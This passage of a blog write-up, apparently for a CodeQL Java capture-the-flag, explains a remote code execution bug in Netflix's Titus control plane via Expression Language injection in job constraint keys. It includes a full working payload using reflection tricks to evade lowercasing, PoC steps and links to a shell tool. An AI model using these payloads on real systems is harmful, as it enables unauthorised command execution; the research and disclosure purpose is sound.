<p>A neat data model for Titus can be found <a href="https://github.com/Netflix/titus-api-definitions/blob/master/doc/Titus_v3_data_model.png">here</a>. It clearly shows that <code class="language-plaintext highlighter-rouge">softConstraints</code> and <code class="language-plaintext highlighter-rouge">hardConstraints</code> are inside the class <code class="language-plaintext highlighter-rouge">Container</code> and an instance of class is made under <code class="language-plaintext highlighter-rouge">JobDescriptor</code>. So, I make a reasonable guess that we can tweak the JobDescriptor object while creating a job to get an RCE. In the main readme file of titus-control-plane, under the section (<a href="https://github.com/Netflix/titus-control-plane#local-testing-with-docker-compose">here</a>) they have provided the basic curl request to submit a job. We need to just add the keys <code class="language-plaintext highlighter-rouge">softConstraints</code> and <code class="language-plaintext highlighter-rouge">hardConstraints</code> to the data payload. A very basic payload should be:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"applicationName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"myApp"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"owner"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"teamEmail"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hello@gmail.com"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"container"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"resources"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"cpu"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
            </span><span class="nl">"memoryMB"</span><span class="p">:</span><span class="w"> </span><span class="mi">128</span><span class="p">,</span><span class="w">
            </span><span class="nl">"diskMB"</span><span class="p">:</span><span class="w"> </span><span class="mi">128</span><span class="p">,</span><span class="w">
            </span><span class="nl">"networkMbps"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"securityProfile"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"iamRole"</span><span class="p">:</span><span class="w"> </span><span class="s2">"test-role"</span><span class="p">,</span><span class="w"> </span><span class="nl">"securityGroups"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"sg-test"</span><span class="p">]},</span><span class="w">
        </span><span class="nl">"image"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ubuntu"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"tag"</span><span class="p">:</span><span class="w"> </span><span class="s2">"xenial"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"softConstraints"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"constraints"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"#{6*9}"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lol"</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"hardConstraints"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"constraints"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"#{6*9}"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lol"</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"service"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"capacity"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"min"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
            </span><span class="nl">"max"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
            </span><span class="nl">"desired"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"retryPolicy"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"immediate"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"retries"</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>We see a successful response -</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"statusCode"</span><span class="p">:</span><span class="w"> </span><span class="mi">400</span><span class="p">,</span><span class="w">
    </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Invalid Argument: {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [54]', type: 'HARD''}, {Validation failed: 'field: 'container.hardConstraints', description: 'Unrecognized constraints [54]', type: 'HARD''}, {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [54]', type: 'HARD''}"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Things get interesting when we send an actual exploit, i.e we send the EL Expression <code class="language-plaintext highlighter-rouge">#{''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("touch /tmp/hello")')}</code></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"statusCode"</span><span class="p">:</span><span class="w"> </span><span class="mi">500</span><span class="p">,</span><span class="w">
    </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Unexpected error: HV000149: An exception occurred during message interpolation"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>We open our debugger, and we find that when creating a job, first individual constraints are validated (using <code class="language-plaintext highlighter-rouge">isValid</code> function in <code class="language-plaintext highlighter-rouge">SchedulingConstraintValidator.java</code> file) to see if valid keys are sent, then validation for the complete set is done to see if both constraint sets dont contain anything common.</p>

<p>As the validation is done inside <code class="language-plaintext highlighter-rouge">SchedulingConstraintValidator.java</code> file first, we see that in the <code class="language-plaintext highlighter-rouge">isValid</code> function:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set&lt;String&gt; namesInLowerCase = value.keySet().stream().map(String::toLowerCase).collect(Collectors.toSet());
</code></pre></div></div>

<p>This is why we get 500. The complete EL expression is converted to lowercase, i.e</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#{''.class.forname('javax.script.scriptenginemanager').newinstance().getenginebyname('js').eval('java.lang.runtime.getruntime().exec("touch /tmp/hello")')}
</code></pre></div></div>
<p>which should obviously error because Java doesn’t know any class by name “javax.script.scriptenginemanager”. Even though this lowercasing doesn’t happen in <code class="language-plaintext highlighter-rouge">SchedulingConstraintSetValidator.java</code>, but the code errors before reaching there.</p>

<p>So we now need to forge an EL expression such that all the letters in the code are in lowercase (which is tough, because Java inherently uses camel-case).</p>
      <h3 id="lowercase-remedy">
        
        
          Lowercase Remedy <a href="#lowercase-remedy" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>For achieving this, we use <code class="language-plaintext highlighter-rouge">a.class.methods[*].invoke(a, args...)</code> to invoke any method, instead of invoking them by <code class="language-plaintext highlighter-rouge">a.methodCanContainCapitalLetters(args...)</code>. Only thing we need to do is to find at what index of <code class="language-plaintext highlighter-rouge">a.class.methods</code> does the function we need lie. We can also use <code class="language-plaintext highlighter-rouge">'a'.replace('a', 83)</code> to print “S” and other such strings.</p>

<p>The below table contains some of the examples,</p>

<table>
  <thead>
    <tr>
      <th>Required Code</th>
      <th>Payload</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">''.class.forName(x)</code></td>
      <td><code class="language-plaintext highlighter-rouge">''.class.class.methods[0].invoke(''.class, x)</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">''.class.forName('javax.script.ScriptEngineManager')</code></td>
      <td><code class="language-plaintext highlighter-rouge">''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">''.class.forName('javax.script.ScriptEngineManager').newInstance()</code></td>
      <td><code class="language-plaintext highlighter-rouge">''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager'))</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js')</code></td>
      <td><code class="language-plaintext highlighter-rouge">''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js')</code></td>
    </tr>
  </tbody>
</table>
      <h3 id="final-payload">
        
        
          Final Payload <a href="#final-payload" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>Continuing such translation, I managed to run <code class="language-plaintext highlighter-rouge">''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').compile('java.lang.Runtime.getRuntime().exec("touch /tmp/hello")').eval()</code></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"applicationName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"myApp"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"owner"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"teamEmail"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hello@gmail.com"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"container"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"resources"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"cpu"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
            </span><span class="nl">"memoryMB"</span><span class="p">:</span><span class="w"> </span><span class="mi">128</span><span class="p">,</span><span class="w">
            </span><span class="nl">"diskMB"</span><span class="p">:</span><span class="w"> </span><span class="mi">128</span><span class="p">,</span><span class="w">
            </span><span class="nl">"networkMbps"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"securityProfile"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"iamRole"</span><span class="p">:</span><span class="w"> </span><span class="s2">"test-role"</span><span class="p">,</span><span class="w"> </span><span class="nl">"securityGroups"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"sg-test"</span><span class="p">]},</span><span class="w">
        </span><span class="nl">"image"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ubuntu"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"tag"</span><span class="p">:</span><span class="w"> </span><span class="s2">"xenial"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"softConstraints"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"hardConstraints"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"constraints"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"#{''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js').class.methods[7].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js'), 'print(1);').class.methods[3].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js').class.methods[7].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js'), 'java.lang.' + 'a'.replace('a', 82) +  'untime.get' + 'a'.replace('a', 82) + 'untime().exec(\"touch /tmp/pwn\")')) + ''}"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lol"</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"service"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"capacity"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"min"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
            </span><span class="nl">"max"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
            </span><span class="nl">"desired"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"retryPolicy"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"immediate"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"retries"</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p><img src="/static/assets/codeql/tada.png" alt="" /></p>

<p>:tada:</p>

<p>But this payload contains a particular caveat. Index for a particular function changes with different boots. This happens generally for the methods with multiple overloads, like <code class="language-plaintext highlighter-rouge">compile</code> function which have overloads for both <code class="language-plaintext highlighter-rouge">String</code> and <code class="language-plaintext highlighter-rouge">Reader</code>. Hence we need to find the index first. I observed the change of index from 7 to 6. So it’s important to first find at what indexes our desired functions are, then we can execute our code. But <code class="language-plaintext highlighter-rouge">compile</code> doesn’t contain capital letters (I forgot this :p), this problem doesn’t pose that much problem for us.</p>

<p>A more refined version of this payload is present in this <a href="https://github.com/kanav99/github-java-ctf/tree/master/payloads/refined.sh">file</a> (if you need to see only json, see this <a href="https://github.com/kanav99/github-java-ctf/tree/master/payloads/refined.json">file</a>) but the caveat is still present there. I never experienced a problem, but as we still are using indexes, problem can occur. Best way to handle this is by making a loop of all indexes and fetch the  method’s signature and see at which index you see the required method.</p>

<p>A python project where you can run a complete shell (like in SSH) is present <a href="https://github.com/kanav99/github-java-ctf/tree/master/titus-shell/">here</a>.</p>
<p align="center">
  <a href="https://asciinema.org/a/ISMpd2C6Rn1NV1Y2SyyqE8I1P">
    <img src="https://asciinema.org/a/ISMpd2C6Rn1NV1Y2SyyqE8I1P.svg" />
  </a>
</p>
      <h3 id="41-poc-reproducing-vulnerability-locally">
        
        
          4.1 PoC: Reproducing vulnerability locally <a href="#41-poc-reproducing-vulnerability-locally" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>Dependencies other than that for Titus:</p>
<ol>
  <li>Python 3</li>
</ol>

<p>Steps:</p>
<ol>
  <li>Setup titus-control-plane at commit 8a8bd4c at default ports (7001).</li>
  <li>Change directory to <code class="language-plaintext highlighter-rouge">titus-shell/</code> in this repository.</li>
  <li>Install the package dependencies (in a virtual environment maybe) using <code class="language-plaintext highlighter-rouge">pip3 install -r requirements.txt</code></li>
  <li>Run <code class="language-plaintext highlighter-rouge">python3 shell.py</code> to start the shell.</li>
  <li>Any command you enter would run on the <code class="language-plaintext highlighter-rouge">gateway</code> container of titus.</li>
</ol>

<p>If you don’t wish to run a shell, just copy the contents of the <a href="https://github.com/kanav99/github-java-ctf/tree/master/payloads/refined.sh">refined.sh</a> file and paste it to your shell. You will see that a file <code class="language-plaintext highlighter-rouge">/tmp/pwn</code> is made in the <code class="language-plaintext highlighter-rouge">gateway</code> container.</p>

<p>Please note that this is a sort of shell, not a complete shell. So shell builtins (like cd) and redirections (echo abc &gt; a.txt) won’t work.</p>
      <h3 id="42-remediation">
        
        
          4.2 Remediation <a href="#42-remediation" class="anchor-heading">#</a>
        
        
      </h3>
    

<p>Running the same query on latest commit on LGTM.com (link - https://lgtm.com/query/3543348055529973809/) gives me no alerts!</p>

<p><img src="/static/assets/codeql/lgtm.png" alt="" /></p>
      <h2 id="ending-remarks-and-feedback">
        
        
          Ending remarks and Feedback <a href="#ending-remarks-and-feedback" class="anchor-heading">#</a>
        
        
      </h2>
    

<p>This was my first use of CodeQL and must say, writing queries was not a pain at all because of the autocomplete feature, thumbs up to that! But the engine takes up a lot of temporary space on laptop, and I happened to be almost running out of space on my laptop. I feel CodeQL is a powerful tool, and I am planning to perform static analysis on firefox after this, thanks to creators of this awesome tool! Cheers!</p>


<script src="https://utteranc.es/client.js"
    repo="vrongmeal/vrongmeal.github.io"
    issue-term="title"
    label="comment"
    theme="preferred-color-scheme"
    crossorigin="anonymous"
    async>
</script>


  </main>

</div>

<script
  type="text/javascript"
  src="/static/scripts/index.js"
></script>


  </body>

</html>
